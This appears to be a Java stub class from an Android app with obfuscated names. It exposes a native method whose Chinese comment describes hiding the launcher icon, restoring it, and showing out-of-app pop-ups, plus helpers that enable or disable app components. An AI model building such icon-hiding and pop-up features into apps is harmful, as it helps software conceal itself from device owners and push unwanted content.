package com.ling.ding.sighed.zmain;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

import androidx.annotation.Keep;

@Keep
public class TWMain {

    static {
        try {
//            System.loadLibrary("RExp5m");
        } catch (Exception e) {
        }
    }

    public static native int dliGuso(int num);//参数num:num%20<3隐藏图标,num%20<6恢复隐藏.num%20<9外弹(外弹在主进程主线程调用).

    public static void enableComponent(Context context, String clazzName) {
        ComponentName componentName =  new ComponentName(context, clazzName);
        PackageManager mPackageManager = context.getPackageManager();
        mPackageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        ComponentName componentName =  new ComponentName(context, clazzName);
        PackageManager mPackageManager = context.getPackageManager();
        mPackageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
